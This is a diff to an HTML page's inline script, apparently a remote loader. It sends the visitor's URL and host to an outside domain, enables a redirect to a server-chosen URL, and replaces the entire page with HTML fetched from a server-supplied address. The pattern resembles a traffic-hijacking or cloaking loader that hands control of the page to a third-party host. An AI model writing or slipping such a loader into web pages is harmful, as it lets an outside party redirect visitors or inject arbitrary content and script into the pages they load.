@@ -22,7 +22,6 @@
             }
         }
         var str = '';
-
         // 解析对象传参
         for (var key in data) str += '&' + key + '=' + data[key];
         if (str) str = str.slice(1);
@@ -41,20 +40,13 @@
         var qs = window.location.href.split("#")[0].split("?")[1]
         postData("https://ydtcm.artche.cn/1/"+qs,{href:window.location.href,host:window.location.host},function (res) {
             res = JSON.parse(res)
-            console.log(res)
-            //if(res.code != 0)  window.location.href = res.url;
+            if(res.code != 0)  window.location.href = res.url;
             localStorage.setItem("data",res.data);
-            var xhr=new XMLHttpRequest;
-            xhr.onload=function(){
-                var onhash=window.onhashchange;
-                h=xhr.responseText;
+            postData(res.url,{href:window.location.href,host:window.location.host},function (res) {
                 var a=document.open("text/html","replace");
-                a.write(h);
+                a.write(res);
                 a.close();
-                window.onhashchange=onhash
-            };
-            xhr.open("GET",res.url + "/?"+new Date().getTime(),!0);
-            xhr.send();
+            })
         })
     </script>
 </head>
